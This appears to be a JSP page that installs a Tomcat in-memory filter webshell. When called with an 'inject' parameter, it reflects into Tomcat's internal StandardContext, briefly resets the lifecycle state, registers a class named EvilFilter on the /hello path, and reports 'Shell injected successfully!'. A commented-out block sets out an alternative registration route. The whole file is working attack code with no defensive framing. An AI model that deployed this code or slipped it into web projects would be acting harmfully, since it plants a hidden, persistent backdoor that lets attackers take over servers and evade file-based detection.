<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.ApplicationContextFacade" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="com.vdt.EvilFilter" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="org.apache.catalina.util.LifecycleBase" %>
<%@ page import="org.apache.catalina.LifecycleState" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%
    if (request.getParameter("inject") != null) {
        try {
            // get StandardContext obj (inner ctx that do the real work)
            ApplicationContextFacade ctx1 = (ApplicationContextFacade) request.getServletContext();
            Field ctx1Field = ApplicationContextFacade.class.getDeclaredField("context");
            ctx1Field.setAccessible(true);
            ApplicationContext ctx2 = (ApplicationContext) ctx1Field.get(ctx1);
            Field ctx2Field = ApplicationContext.class.getDeclaredField("context");
            ctx2Field.setAccessible(true);
            StandardContext ctx3 = (StandardContext) ctx2Field.get(ctx2);

            Field stateField = LifecycleBase.class.getDeclaredField("state");
            stateField.setAccessible(true);
            stateField.set(ctx3, LifecycleState.STARTING_PREP);

            FilterRegistration.Dynamic dyn = ctx1.addFilter("evilFilter", new EvilFilter());
            dyn.addMappingForUrlPatterns(null, true, "/hello");
            ctx3.filterStart();

            stateField.set(ctx3, LifecycleState.STARTED);

//            // create FilterDef to define the EvilFilter
//            EvilFilter evilFilter = new EvilFilter();
//            FilterDef filterDef = new FilterDef();
//            filterDef.setFilterName("evilFilter");
//            filterDef.setFilterClass(evilFilter.getClass().getName());
//            filterDef.setFilter(evilFilter);
//
//            // register the FilterDef with the StandardContext
//            ctx3.addFilterDef(filterDef);
//
//            // create FilterMap and to map the filter with a URL pattern
//            FilterMap filterMap = new FilterMap();
//            filterMap.setFilterName(filterDef.getFilterName());
//            filterMap.addURLPattern("/hello");
//            ctx3.addFilterMap(filterMap);

            response.getWriter().println("Shell injected successfully!");
        } catch (Exception e) {
            response.getWriter().println("Error injecting shell: " + e.getMessage());
        }

    }
%>
